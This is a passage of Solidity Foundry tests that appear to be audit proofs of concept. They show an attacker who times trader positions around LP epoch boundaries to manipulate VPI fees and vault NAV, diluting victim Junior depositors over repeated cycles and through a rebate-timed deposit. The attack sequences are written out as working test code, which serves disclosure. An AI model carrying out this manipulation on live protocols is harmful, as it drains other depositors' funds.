        vm.prank(VICTIM_JUNIOR);
        juniorVault.claimRedeem(id, shares, VICTIM_JUNIOR, VICTIM_JUNIOR);
        received = settlementToken.balanceOf(VICTIM_JUNIOR) - before;
    }

    function _traderCashOut(
        address trader
    ) internal returns (uint256 bal) {
        bal = clearinghouse.balanceAssets(trader);
        vm.prank(trader);
        clearinghouse.withdraw(trader, bal);
    }

}

/// @notice Severity amplification: attacker owns ~86% of Junior, re-cycles every 3 hours (1 h cooldown, hourly
///         epochs, 5 min cutoff respected). Victim Junior loses ~0.7% of principal per cycle, compounding.
contract VpiMultiCycleTest is VpiVariantBase {

    uint256 internal constant VICTIM_JUNIOR_ASSETS = 1_000_000e6;
    uint256 internal constant VICTIM_SENIOR_ASSETS = 3_500_000e6;
    uint256 internal constant ATTACKER_LP_ASSETS = 6_300_000e6;
    uint256 internal constant TRADER_FUNDING = 300_000e6;
    uint256 internal constant TRADER_MARGIN = 100_000e6;
    uint256 internal constant CYCLES = 20;

    struct Result {
        uint256 attackerLpFinal;
        uint256 attackerTraderFinal;
        uint256 victimJuniorValue;
        uint256 victimSeniorValue;
        uint256 victimRedeemed;
        uint256[CYCLES] victimValueAfterCycle;
        uint256[CYCLES] vpiPaid;
        uint256 juniorPrincipalEnd;
        uint256 seniorPrincipalEnd;
        uint256 seniorHwmEnd;
    }

    function test_multiCycle_highShare() public {
        uint256 snap = vm.snapshotState();
        Result memory c = _run(false);
        vm.revertToState(snap);
        Result memory a = _run(true);

        for (uint256 i; i < CYCLES; ++i) {
            emit log_named_uint(string.concat("cycle ", vm.toString(i + 1), " VPI paid on open"), a.vpiPaid[i]);
            emit log_named_uint(
                string.concat("cycle ", vm.toString(i + 1), " victim junior value CONTROL"), c.victimValueAfterCycle[i]
            );
            emit log_named_uint(
                string.concat("cycle ", vm.toString(i + 1), " victim junior value ATTACK "), a.victimValueAfterCycle[i]
            );
        }
        int256 cNet = int256(c.attackerLpFinal + c.attackerTraderFinal) - int256(ATTACKER_LP_ASSETS + TRADER_FUNDING);
        int256 aNet = int256(a.attackerLpFinal + a.attackerTraderFinal) - int256(ATTACKER_LP_ASSETS + TRADER_FUNDING);
        emit log_named_int("attacker net USDG (LP exit + trader cash - funding) CONTROL", cNet);
        emit log_named_int("attacker net USDG (LP exit + trader cash - funding) ATTACK ", aNet);
        emit log_named_uint("victim junior marked value end CONTROL", c.victimJuniorValue);
        emit log_named_uint("victim junior marked value end ATTACK ", a.victimJuniorValue);
        emit log_named_uint("victim junior USDG for 1% redeem CONTROL", c.victimRedeemed);
        emit log_named_uint("victim junior USDG for 1% redeem ATTACK ", a.victimRedeemed);
        emit log_named_uint("victim senior marked value CONTROL", c.victimSeniorValue);
        emit log_named_uint("victim senior marked value ATTACK ", a.victimSeniorValue);
        emit log_named_uint("senior principal / HWM end ATTACK", a.seniorPrincipalEnd);
        emit log_named_uint("senior HWM end ATTACK", a.seniorHwmEnd);

        assertGt(aNet, 0, "attacker profitable after fees+carry");
        assertGt(aNet, cNet, "attack beats control");
        assertLt(a.victimJuniorValue, c.victimJuniorValue, "victim junior diluted");
        assertLt(a.victimRedeemed, c.victimRedeemed, "victim junior receives less");
    }

    function _run(
        bool attack
    ) internal returns (Result memory r) {
        _setSeniorCapacity(40_000_000e6, 8000);
        // Start the scenario on the next Monday 10:00 UTC so all cycles fall inside the FX trading week.
        {
            uint256 week = 7 days;
            uint256 weeksAhead = (block.timestamp - SETUP_TIMESTAMP + week - 1) / week;
            vm.warp(SETUP_TIMESTAMP + weeksAhead * week);
        }
        _fundJunior(VICTIM_JUNIOR, VICTIM_JUNIOR_ASSETS);
        _fundSenior(VICTIM_SENIOR, VICTIM_SENIOR_ASSETS);
        uint256 victimShares = juniorVault.balanceOf(VICTIM_JUNIOR);
        uint256 seniorShares = seniorVault.balanceOf(VICTIM_SENIOR);
        _fundJuniorDelayed(ATTACKER, ATTACKER_LP_ASSETS);
        _fundTrader(ATTACKER_TRADER, TRADER_FUNDING);

        for (uint256 i; i < CYCLES; ++i) {
            uint256 readyAt = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
            if (block.timestamp < readyAt) {
                vm.warp(readyAt);
            }
            uint256 attackerShares = juniorVault.balanceOf(ATTACKER);
            vm.prank(ATTACKER);
            uint256 redeemId = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);

            // Two minutes before the boundary (inside the 5-minute request cutoff), open max skew.
            vm.warp(pool.lpEpochStart(redeemId) - 120);
            uint256 size;
            if (attack) {
                size = _sizeAtDepthFraction(3900);
                uint256 assetsBefore = pool.accountedAssets();
                _openVia(ATTACKER_TRADER, CfdTypes.Side.LONG, size, TRADER_MARGIN);
                r.vpiPaid[i] = pool.accountedAssets() - assetsBefore;
            }

            vm.warp(pool.lpEpochStart(redeemId));
            router.settleLpEpoch(_mockPythUpdateData());
            assertEq(juniorVault.claimableRedeemRequest(redeemId, ATTACKER), attackerShares, "attacker fully funded");
            uint256 before = settlementToken.balanceOf(ATTACKER);
            vm.prank(ATTACKER);
            juniorVault.claimRedeem(redeemId, attackerShares, ATTACKER, ATTACKER);
            uint256 received = settlementToken.balanceOf(ATTACKER) - before;

            if (attack) {
                _closeVia(ATTACKER_TRADER, CfdTypes.Side.LONG, size);
            }

            if (i + 1 < CYCLES) {
                _depositAndClaim(ATTACKER, received);
            } else {
                r.attackerLpFinal = received;
            }
            r.victimValueAfterCycle[i] = juniorVault.convertToAssets(victimShares);
        }

        r.attackerTraderFinal = _traderCashOut(ATTACKER_TRADER);
        r.victimJuniorValue = juniorVault.convertToAssets(victimShares);
        r.victimSeniorValue = seniorVault.convertToAssets(seniorShares);
        r.victimRedeemed = _victimRedeemFraction(victimShares, 100);
        r.juniorPrincipalEnd = pool.juniorPrincipal();
        r.seniorPrincipalEnd = pool.seniorPrincipal();
        r.seniorHwmEnd = pool.seniorHighWaterMark();
    }

}

/// @notice Reverse direction: an honest skew exists; the attacker's skew-REDUCING open is paid a VPI rebate from pool
///         cash (locked in the trader's VPI reserve, which NAV excludes), so Junior NAV is deflated exactly while the
///         attacker's Junior deposit is priced. The close claws the rebate back and the attacker owns most of it.
contract VpiReverseDirectionTest is VpiVariantBase {

    uint256 internal constant VICTIM_JUNIOR_ASSETS = 1_000_000e6;
    uint256 internal constant VICTIM_SENIOR_ASSETS = 3_500_000e6;
    uint256 internal constant ATTACKER_LP_ASSETS = 9_000_000e6;
    uint256 internal constant TRADER_FUNDING = 200_000e6;
    uint256 internal constant TRADER_MARGIN = 60_000e6;

    struct Result {
        uint256 attackerLpReceived;
        uint256 attackerTraderFinal;
        uint256 victimJuniorValue;
        uint256 victimRedeemed;
        uint256 rebatePaid;
        uint256 juniorPrincipalAtEntry;
        uint256 attackerShares;
        uint256 clawbackAtClose;
        int256 freshCloseVpiAtNewDepth;
    }

    function test_reverse_depositAtDeflatedNav() public {
        uint256 snap = vm.snapshotState();
        Result memory c = _run(false);
        vm.revertToState(snap);
        Result memory a = _run(true);

        int256 cNet =
            int256(c.attackerLpReceived + c.attackerTraderFinal) - int256(ATTACKER_LP_ASSETS + TRADER_FUNDING);
        int256 aNet =
            int256(a.attackerLpReceived + a.attackerTraderFinal) - int256(ATTACKER_LP_ASSETS + TRADER_FUNDING);
        emit log_named_uint("VPI rebate paid by pool on attacker open", a.rebatePaid);
        emit log_named_uint("junior principal at deposit pricing CONTROL", c.juniorPrincipalAtEntry);
        emit log_named_uint("junior principal at deposit pricing ATTACK ", a.juniorPrincipalAtEntry);
        emit log_named_uint("attacker junior shares minted CONTROL", c.attackerShares);
        emit log_named_uint("attacker junior shares minted ATTACK ", a.attackerShares);
        emit log_named_int("attacker net USDG CONTROL", cNet);
        emit log_named_int("attacker net USDG ATTACK ", aNet);
        emit log_named_uint("victim junior marked value CONTROL", c.victimJuniorValue);
        emit log_named_uint("victim junior marked value ATTACK ", a.victimJuniorValue);
        emit log_named_uint("victim junior USDG for 5% redeem CONTROL", c.victimRedeemed);
        emit log_named_uint("victim junior USDG for 5% redeem ATTACK ", a.victimRedeemed);
        emit log_named_uint("pool accountedAssets increase at attacker close (clawback+carry)", a.clawbackAtClose);
        emit log_named_int("unclamped fresh close VPI at post-deposit depth", a.freshCloseVpiAtNewDepth);

        assertGt(aNet, cNet, "attack beats control");
        assertGt(aNet, 0, "attacker profitable");
        assertLt(a.victimJuniorValue, c.victimJuniorValue, "victim diluted");
    }

    function _run(
        bool attack
    ) internal returns (Result memory r) {
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(VICTIM_JUNIOR, VICTIM_JUNIOR_ASSETS);
        _fundSenior(VICTIM_SENIOR, VICTIM_SENIOR_ASSETS);
        uint256 victimShares = juniorVault.balanceOf(VICTIM_JUNIOR);

        // Honest LONG skew at ~39% of depth, open for the whole scenario.
        _fundTrader(HONEST_TRADER, TRADER_FUNDING);
        uint256 honestSize = _sizeAtDepthFraction(3900);
        _openVia(HONEST_TRADER, CfdTypes.Side.LONG, honestSize, TRADER_MARGIN);

        // Attacker queues an ordinary Junior deposit (before cutoff).
        settlementToken.mint(ATTACKER, ATTACKER_LP_ASSETS);
        vm.startPrank(ATTACKER);
        settlementToken.approve(address(juniorVault), ATTACKER_LP_ASSETS);
        uint256 depId = juniorVault.requestDeposit(ATTACKER_LP_ASSETS, ATTACKER, ATTACKER);
        vm.stopPrank();
        _fundTrader(ATTACKER_TRADER, TRADER_FUNDING);

        if (attack) {
            // Two minutes before the boundary: open the opposite side, taking skew from S0 to ~0.
            vm.warp(pool.lpEpochStart(depId) - 120);
            uint256 assetsBefore = pool.accountedAssets();
            _openVia(ATTACKER_TRADER, CfdTypes.Side.SHORT, honestSize, TRADER_MARGIN);
            r.rebatePaid = assetsBefore - pool.accountedAssets();
        }

        vm.warp(pool.lpEpochStart(depId));
        router.settleLpEpoch(_mockPythUpdateData());
        r.juniorPrincipalAtEntry = pool.juniorPrincipal();
        uint256 claimable = juniorVault.claimableDepositRequest(depId, ATTACKER);
        assertEq(claimable, ATTACKER_LP_ASSETS, "attacker deposit activated");
        vm.prank(ATTACKER);
        r.attackerShares = juniorVault.claimDeposit(depId, claimable, ATTACKER, ATTACKER);

        if (attack) {
            // Unwind: the close re-creates the honest skew; lifetime clamp claws back exactly the rebate.
            uint256 depthNow = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
            r.freshCloseVpiAtNewDepth = CfdMath.calculateVPI(0, honestSize / 1e12, depthNow, 0.01e18);
            uint256 assetsBeforeClose = pool.accountedAssets();
            _closeVia(ATTACKER_TRADER, CfdTypes.Side.SHORT, honestSize);
            r.clawbackAtClose = pool.accountedAssets() - assetsBeforeClose;
        }

        r.attackerLpReceived = _redeemAllAfterCooldown(ATTACKER);
        r.attackerTraderFinal = _traderCashOut(ATTACKER_TRADER);
        r.victimJuniorValue = juniorVault.convertToAssets(victimShares);
        r.victimRedeemed = _victimRedeemFraction(victimShares, 500);
    }

}
```

